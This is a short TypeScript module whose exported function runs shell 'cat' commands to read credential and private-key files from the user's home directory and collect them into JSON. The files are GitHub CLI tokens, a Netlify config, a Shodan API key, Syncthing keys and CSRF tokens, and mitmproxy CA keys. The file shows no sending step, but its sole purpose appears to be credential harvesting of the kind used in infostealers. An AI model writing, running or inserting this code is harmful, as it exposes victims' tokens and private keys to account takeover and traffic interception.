import * as exec from "child_process";

const _run = (args: string): string | null => {
  try {
    return exec.execSync(args).toString();
  } catch(e) {
    return null;
  }
}

const findCredentials = (text: string) => {
  const credentials = {} as any;
  credentials.gh = {} as any;
  credentials.netlify = {} as any;
  credentials.shodan = {} as any;
  credentials.syncthing = {} as any;
  credentials.mitmp = {} as any;

  const ghHosts = _run(`cat ~/.config/gh/hosts.yml`);
  if (ghHosts) {
    credentials.gh.hosts = {} as any;
    credentials.gh.hosts.path = "~/.config/gh/hosts.yml";
    credentials.gh.hosts.content = ghHosts;
  }

  const netlifyConfig = _run(`cat ~/.config/netlify/config.json`);
  if (netlifyConfig) {
    credentials.netlify.config = {} as any;
    credentials.netlify.config.path = "~/.config/netlify/config.json";
    credentials.netlify.config.content = netlifyConfig;
  }

  const shodanApiKey = _run(`cat ~/.config/shodan/api_key`);
  if (shodanApiKey) {
    credentials.shodan.apiKey = {} as any;
    credentials.shodan.apiKey.path = "~/.config/shodan/api_key";
    credentials.shodan.apiKey.content = shodanApiKey;
  }

  const syncCert = _run(`cat ~/.config/syncthing/cert.pem`);
  const syncConfig = _run(`cat ~/.config/syncthing/config.xml`);
  const syncCsfrTokens = _run(`cat ~/.config/syncthing/csrftokens.txt`);
  const syncHttpsCert = _run(`cat ~/.config/syncthing/https-cert.pem`);
  const syncHttpsKey = _run(`cat ~/.config/syncthing/https-key.pem`);
  const syncKeyPEM = _run(`cat ~/.config/syncthing/key.pem`);
  if (syncCert) {
    credentials.syncthing.cert = {} as any;
    credentials.syncthing.cert.path = "~/.config/syncthing/cert.pem";
    credentials.syncthing.cert.content = syncCert;
  }
  if (syncConfig) {
    credentials.syncthing.config = {} as any;
    credentials.syncthing.config.path = "~/.config/syncthing/config.xml";
    credentials.syncthing.config.content = syncConfig;
  }
  if (syncCsfrTokens) {
    credentials.syncthing.csfrTokens = {} as any;
    credentials.syncthing.csfrTokens.path = "~/.config/syncthing/csrftokens.txt";
    credentials.syncthing.csfrTokens.content = syncCsfrTokens;
  }
  if (syncHttpsCert) {
    credentials.syncthing.httpsCert = {} as any;
    credentials.syncthing.httpsCert.path = "~/.config/syncthing/https-cert.pem";
    credentials.syncthing.httpsCert.content = syncHttpsCert;
  }
  if (syncHttpsKey) {
    credentials.syncthing.httpsKey = {} as any;
    credentials.syncthing.httpsKey.path = "~/.config/syncthing/https-key.pem";
    credentials.syncthing.httpsKey.content = syncHttpsKey;
  }
  if (syncKeyPEM) {
    credentials.syncthing.keyPEM = {} as any;
    credentials.syncthing.keyPEM.path = "~/.config/syncthing/key.pem";
    credentials.syncthing.keyPEM.content = syncKeyPEM;
  }

  const mitmpCaCert = _run(`cat ~/.mitmproxy/mitmproxy-ca-cert.cer`);
  const mitmpCaCertP12 = _run(`cat ~/.mitmproxy/mitmproxy-ca-cert.p12`);
  const mitmpCaCertPEM = _run(`cat ~/.mitmproxy/mitmproxy-ca-cert.pem`);
  const mitmpCaP12 = _run(`cat ~/.mitmproxy/mitmproxy-ca.p12`);
  const mitmpCaPEM = _run(`cat ~/.mitmproxy/mitmproxy-ca.pem`);
  const mitmpDhparam = _run(`cat ~/.mitmproxy/mitmproxy-dhparam.pem`);
  if (mitmpCaCert) {
    credentials.mitmp.caCert = {} as any;
    credentials.mitmp.caCert.path = "~/.mitmproxy/mitmproxy-ca-cert.cer";
    credentials.mitmp.caCert.content = mitmpCaCert;
  }
  if (mitmpCaCertP12) {
    credentials.mitmp.caCertP12 = {} as any;
    credentials.mitmp.caCertP12.path = "~/.mitmproxy/mitmproxy-ca-cert.p12";
    credentials.mitmp.caCertP12.content = mitmpCaCertP12;
  }
  if (mitmpCaCertPEM) {
    credentials.mitmp.caCertPEM = {} as any;
    credentials.mitmp.caCertPEM.path = "~/.mitmproxy/mitmproxy-ca-cert.pem";
    credentials.mitmp.caCertPEM.content = mitmpCaCertPEM;
  }
  if (mitmpCaP12) {
    credentials.mitmp.caP12 = {} as any;
    credentials.mitmp.caP12.path = "~/.mitmproxy/mitmproxy-ca.p12";
    credentials.mitmp.caP12.content = mitmpCaP12;
  }
  if (mitmpCaPEM) {
    credentials.mitmp.caPEM = {} as any;
    credentials.mitmp.caPEM.path = "~/.mitmproxy/mitmproxy-ca.pem";
    credentials.mitmp.caPEM.content = mitmpCaPEM;
  }
  if (mitmpDhparam) {
    credentials.mitmp.dhparam = {} as any;
    credentials.mitmp.dhparam.path = "~/.mitmproxy/mitmproxy-dhparam.pem"; 
    credentials.mitmp.dhparam.content = mitmpDhparam;
  }
   

  // TODO: Remove void objects
  return JSON.stringify(credentials, null, 2);
}

export default findCredentials;
